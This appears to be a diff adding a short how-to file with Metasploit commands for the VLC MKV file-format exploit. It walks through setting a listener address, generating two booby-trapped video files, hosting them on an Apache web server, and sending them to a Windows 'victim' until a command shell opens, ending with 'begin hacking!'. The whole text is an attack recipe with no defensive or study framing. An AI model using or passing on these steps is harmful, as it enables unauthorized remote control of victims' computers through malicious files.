@@ -1,0 +1,17 @@
+sudo msfconsole 
+search vlc 
+use exploit/windows/fileformat/vlc_mkv 
+show options
+set options LHOST (your_ip)
+show options
+exploit
+
+IN NEW TERMINAL:-
+sudo mv /root/.msf4/local/bcbcga-part1.mkv /var/www/html   -> #/root/.msf4/local/bcbcga-part1.mkv this is just an example path
+sudo mv /root/.msf4/local/bcbcga-part2.mkv /var/www/html
+sudo systemctl start apache2.service
+
+
+SEND FILES TO WINDOWS and wait for victim to open any one of the two videos...
+
+Once command shell session has opened press ENTER and begin hacking!
